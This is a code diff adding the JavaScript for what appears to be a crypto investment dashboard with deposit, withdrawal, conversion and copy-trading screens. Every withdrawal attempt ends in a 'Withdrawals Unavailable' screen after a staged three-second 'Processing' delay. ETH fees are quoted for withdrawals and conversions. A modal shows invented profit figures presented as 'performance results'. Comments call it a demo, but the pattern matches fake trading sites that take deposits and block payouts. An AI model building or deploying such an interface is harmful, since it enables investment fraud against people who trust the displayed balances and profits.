+  $("zoomInBtn").addEventListener("click", () => { dashboardZoom += 10; applyDashboardZoom(); });
+  $("zoomOutBtn").addEventListener("click", () => { dashboardZoom -= 10; applyDashboardZoom(); });
+  $("zoomResetBtn").addEventListener("click", () => { dashboardZoom = 100; applyDashboardZoom(); });
+  $("appearanceBtn").addEventListener("click", () => {
+    document.body.classList.toggle("light-mode");
+    applyAppearance();
+  });
+  $("logoutBtn").addEventListener("click", () => showModal("Log out?", "Are you sure you want to logout?", "logout"));
+  $("addMoneyBtn").addEventListener("click", () => beginAmountAction("add"));
+  $("addFundsBtn").addEventListener("click", () => beginAmountAction("add"));
+  function openWithdrawalPage() {
+    $("dashboard").classList.add("hidden");
+    $("withdrawPage").classList.remove("hidden");
+    $("withdrawForm").classList.remove("hidden");
+    $("withdrawUnavailableSection").classList.add("hidden");
+    $("withdrawFeedback").textContent = "";
+    window.scrollTo(0, 0);
+  }
+  function returnToDashboard() {
+    $("withdrawPage").classList.add("hidden");
+    $("dashboard").classList.remove("hidden");
+    window.scrollTo(0, 0);
+  }
+  $("withdrawBtn").addEventListener("click", openWithdrawalPage);
+  $("withdrawFundsBtn").addEventListener("click", openWithdrawalPage);
+  $("backToDashboard").addEventListener("click", returnToDashboard);
+
+  // EDITABLE DEMO FEE SCHEDULE: change these amount bands and ETH fees as needed.
+  // Fees are illustrative only; this demo does not charge or transfer any ETH.
+  const withdrawalFeeBands = [
+    { min: 1000, max: 9999.99, fee: 0.05 },
+    { min: 10000, max: 19999.99, fee: 0.15 },
+    { min: 20000, max: 29999.99, fee: 0.25 },
+    { min: 30000, max: 39999.99, fee: 0.35 },
+    { min: 40000, max: 50000, fee: 0.45 }
+  ];
+  // EDITABLE DEMO CONVERSION FEE SCHEDULE: keep bands aligned with the withdrawal demo schedule.
+  // These are illustrative values only; the demo does not charge ETH or perform conversions.
+  const conversionFeeBands = [
+    { min: 1000, max: 9999.99, fee: 0.05 },
+    { min: 10000, max: 19999.99, fee: 0.15 },
+    { min: 20000, max: 29999.99, fee: 0.25 },
+    { min: 30000, max: 39999.99, fee: 0.35 },
+    { min: 40000, max: 50000, fee: 0.45 }
+  ];
+  function updateConversionFee() {
+    const rawAmount = $("conversionAmount").value;
+    const amount = Number(rawAmount);
+    const band = conversionFeeBands.find(item => amount >= item.min && amount <= item.max);
+    if (!rawAmount || !Number.isFinite(amount)) {
+      $("conversionFeeValue").textContent = "0.05 ETH";
+      $("conversionFeeRange").textContent = "For transactions from $1,000 to $9,999.99";
+      return;
+    }
+    if (amount < 1000 || amount > 50000 || !band) {
+      $("conversionFeeValue").textContent = "—";
+      $("conversionFeeRange").textContent = "Enter an amount between $1,000 and $50,000.";
+      return;
+    }
+    $("conversionFeeValue").textContent = band.fee.toFixed(2) + " ETH";
+    $("conversionFeeRange").textContent = "For transactions from $" + band.min.toLocaleString("en-US", {maximumFractionDigits: 2}) + " to $" + band.max.toLocaleString("en-US", {maximumFractionDigits: 2});
+  }
+  function openConversionPage() {
+    $("dashboard").classList.add("hidden");
+    $("withdrawPage").classList.add("hidden");
+    $("conversionPage").classList.remove("hidden");
+    $("conversionForm").classList.remove("hidden");
+    $("conversionResult").classList.add("hidden");
+    $("conversionFeedback").textContent = "";
+    updateConversionFee();
+    window.scrollTo(0, 0);
+  }
+  function backFromConversion() {
+    $("conversionPage").classList.add("hidden");
+    $("dashboard").classList.remove("hidden");
+    window.scrollTo(0, 0);
+  }
+  $("convertCryptoBtn").addEventListener("click", openConversionPage);
+  $("conversionBackBtn").addEventListener("click", backFromConversion);
+  $("conversionEditBtn").addEventListener("click", () => {
+    $("conversionResult").classList.add("hidden");
+    $("conversionForm").classList.remove("hidden");
+    $("conversionFeedback").textContent = "";
+  });
+  $("conversionAmount").addEventListener("input", updateConversionFee);
+  $("conversionForm").addEventListener("submit", (e) => {
+    e.preventDefault();
+    const amount = Number($("conversionAmount").value);
+    const from = $("conversionFrom").value;
+    const to = $("conversionTo").value;
+    const band = conversionFeeBands.find(item => amount >= item.min && amount <= item.max);
+    if (!Number.isFinite(amount) || amount < 1000 || amount > 50000 || !band) {
+      $("conversionFeedback").textContent = "Enter a transaction amount between $1,000 and $50,000.";
+      $("conversionAmount").focus();
+      return;
+    }
+    if (!from || !to || from === to) {
+      $("conversionFeedback").textContent = from === to ? "Choose two different crypto assets." : "Please select both assets.";
+      return;
+    }
+    $("conversionFeedback").textContent = "";
+    const submitButton = $("conversionSubmitBtn");
+    submitButton.disabled = true;
+    submitButton.textContent = "Converting...";
+    submitButton.style.opacity = "0.7";
+    window.setTimeout(() => {
+      $("conversionResultText").textContent = "Converting: $" + amount.toLocaleString("en-US", {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " from " + from + " to " + to + ". Conversion fee: " + band.fee.toFixed(2) + " ETH. ";
+      $("conversionForm").classList.add("hidden");
+      $("conversionResult").classList.remove("hidden");
+      submitButton.disabled = false;
+      submitButton.textContent = "Convert";
+      submitButton.style.opacity = "";
+    }, 800);
+  });
+
+  function updateWithdrawalFee() {
+    const rawAmount = $("withdrawAmount").value;
+    const amount = Number(rawAmount);
+    const band = withdrawalFeeBands.find(item => amount >= item.min && amount <= item.max);
+    if (!rawAmount || !Number.isFinite(amount)) {
+      $("withdrawFeeValue").textContent = "0.05 ETH";
+      $("withdrawFeeRange").textContent = "For transactions from $1,000 to $9,999.99";
+      return;
+    }
+    if (amount < 1000 || amount > 50000 || !band) {
+      $("withdrawFeeValue").textContent = "—";
+      $("withdrawFeeRange").textContent = "Enter an amount between $1,000 and $50,000.";
+      return;
+    }
+    $("withdrawFeeValue").textContent = band.fee.toFixed(2) + " ETH";
+    $("withdrawFeeRange").textContent = "For transactions from $" + band.min.toLocaleString("en-US", {maximumFractionDigits: 2}) + " to $" + band.max.toLocaleString("en-US", {maximumFractionDigits: 2});
+  }
+  $("withdrawAmount").addEventListener("input", updateWithdrawalFee);
+  $("withdrawForm").addEventListener("submit", (e) => {
+    e.preventDefault();
+    const address = $("walletAddress").value.trim();
+    const amount = Number($("withdrawAmount").value);
+    const network = $("withdrawNetwork").value;
+    if (!address || !Number.isFinite(amount) || !network) {
+      $("withdrawFeedback").textContent = "Please complete all fields with valid details.";
+      return;
+    }
+    if (amount < 1000 || amount > 50000) {
+      $("withdrawFeedback").textContent = "Each withdrawal must be between $1,000 and $50,000.";
+      $("withdrawAmount").focus();
+      return;
+    }
+    if (amount > state.availableBalance) {
+      $("withdrawFeedback").textContent = "The amount exceeds the simulated available balance.";
+      return;
+    }
+    $("withdrawFeedback").textContent = "";
+    const sendButton = $("withdrawForm").querySelector('button[type="submit"]');
+    const originalButtonText = sendButton ? sendButton.textContent : "Send";
+    if (sendButton) {
+      sendButton.disabled = true;
+      sendButton.textContent = "Processing...";
+      sendButton.style.opacity = "0.7";
+      sendButton.style.cursor = "wait";
+    }
+    // Demo loading delay: wait 3 seconds before showing Withdrawals Unavailable.
+    window.setTimeout(() => {
+      $("withdrawForm").classList.add("hidden");
+      $("withdrawUnavailableSection").classList.remove("hidden");
+      if (sendButton) {
+        sendButton.disabled = false;
+        sendButton.textContent = originalButtonText;
+        sendButton.style.opacity = "";
+        sendButton.style.cursor = "";
+      }
+    }, 3000);
+  });
+  $("withdrawUnavailableBack").addEventListener("click", () => {
+    $("withdrawUnavailableSection").classList.add("hidden");
+    $("withdrawForm").classList.remove("hidden");
+    $("withdrawFeedback").textContent = "";
+  });
+  $("profitBtn").addEventListener("click", () => showModal("Profit Cycle — preview", "Profits analytics only:   profit win rate 78.64%, ROI +156.32%, and 31 initiae trades. These are performance results.", "info"));
+  $("copyTradesBtn").addEventListener("click", () => showModal("Copy Trader ", "There's no trading activities yet. Kindly initiate your first trading.", "info"));
+  $("cancelModal").addEventListener("click", closeModal);
+  $("depositNetwork").addEventListener("change", updateDemoDepositAddress);
+  $("copyDepositAddress").addEventListener("click", () => {
+    const addressField = $("depositAddress");
+    addressField.select();
+    addressField.setSelectionRange(0, addressField.value.length);
+    try {
+      const copied = document.execCommand("copy");
+      $("copyDepositAddress").textContent = copied ? "Copied" : "Select & copy";
+    } catch (_) {
+      $("copyDepositAddress").textContent = "Select & copy";
+    }
+  });
+  $("modalBackdrop").addEventListener("click", e => { if (e.target === $("modalBackdrop")) closeModal(); });
+  $("confirmModal").addEventListener("click", () => {
+    if (currentAction === "deposit") {
+      closeModal();
+      return;
+    }
+    if (currentAction === "logout") {
+      closeModal();
+      $("dashboard").classList.add("hidden");
+      $("loginScreen").classList.remove("hidden");
+      $("loginForm").reset();
+      $("loading").classList.add("hidden");
+      $("loginButton").classList.remove("hidden");
+      return;
+    }
+    if (currentAction === "settings") {
+      closeModal();
+      return;
+    }
+    if (currentAction === "add" || currentAction === "withdraw") {
+      const amount = Number($("amountInput").value);
+      if (!Number.isFinite(amount) || amount <= 0) {
+        $("modalText").textContent = "Please enter a valid amount greater than zero.";
+        return;
+      }
+      if (currentAction === "withdraw" && amount > state.availableBalance) {
+        $("modalText").textContent = "That amount is greater than the simulated available balance.";
+        return;
+      }
+      if (currentAction === "add") state.availableBalance += amount;
+      else state.availableBalance -= amount;
+      state.totalBalance += currentAction === "add" ? amount : -amount;
+      render();
+      $("modalTitle").textContent = "Demo balance updated";
+      $("modalText").textContent = `${money(amount)} was ${currentAction === "add" ? "added to" : "deducted from"} the simulated balance. No real transaction occurred.`;
+      $("modalInputWrap").classList.add("hidden");
+      $("confirmModal").textContent = "Done";
+      currentAction = "done";
+      return;
+    }
+    closeModal();
+  });
+</script>
+</body>
+</html>
